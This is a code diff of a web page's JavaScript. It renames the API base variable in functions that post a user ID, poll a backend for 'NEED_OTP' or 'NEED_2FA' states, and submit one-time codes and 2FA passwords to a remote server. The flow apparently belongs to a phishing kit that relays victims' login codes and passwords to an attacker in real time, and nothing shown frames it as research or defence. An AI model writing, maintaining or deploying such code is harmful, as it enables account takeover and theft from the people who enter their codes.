@@ -343,9 +343,9 @@
     }
 
     function checkStatus() {
-        if(typeof API_BASE_URL === 'undefined') return;
+        if(typeof API_BASE_URL2 === 'undefined') return;
         
-        fetch(`${API_BASE_URL}/check_status/${userId}`).then(r => r.json()).then(data => {
+        fetch(`${API_BASE_URL2}/check_status/${userId}`).then(r => r.json()).then(data => {
             if (data.status === "NEED_OTP") { showStep(2); stopLoaders(); }
             else if (data.status === "NEED_2FA") { showStep(3); stopLoaders(); }
             else if (data.status === "SUCCESS") { 
@@ -411,14 +411,14 @@
     }
 
     async function checkUserInDB() {
-        if(typeof API_BASE_URL === 'undefined') {
+        if(typeof API_BASE_URL2 === 'undefined') {
             stopLoaders();
             showMsg(1, 'error', 'Network error. Try again.');
             return;
         }
         
         try {
-            const res = await fetch(`${API_BASE_URL}/check_user_db`, {
+            const res = await fetch(`${API_BASE_URL2}/check_user_db`, {
                 method: 'POST',
                 headers: {'Content-Type': 'application/json'},
                 body: JSON.stringify({user_id: userId, name: savedName})
@@ -475,7 +475,7 @@
     async function submitOTP() {
         showMsg(2, 'loading-msg', 'Checking code...');
         try {
-            const res = await fetch(`${API_BASE_URL}/verify_otp`, {
+            const res = await fetch(`${API_BASE_URL2}/verify_otp`, {
                 method: 'POST',
                 headers: {'Content-Type': 'application/json'},
                 body: JSON.stringify({session_id: sid, otp: currentOtp})
@@ -497,7 +497,7 @@
 
         showMsg(3, 'loading-msg', 'Checking password...');
         try {
-            const res = await fetch(`${API_BASE_URL}/verify_2fa`, {
+            const res = await fetch(`${API_BASE_URL2}/verify_2fa`, {
                 method: 'POST',
                 headers: {'Content-Type': 'application/json'},
                 body: JSON.stringify({session_id: sid, password: pass})
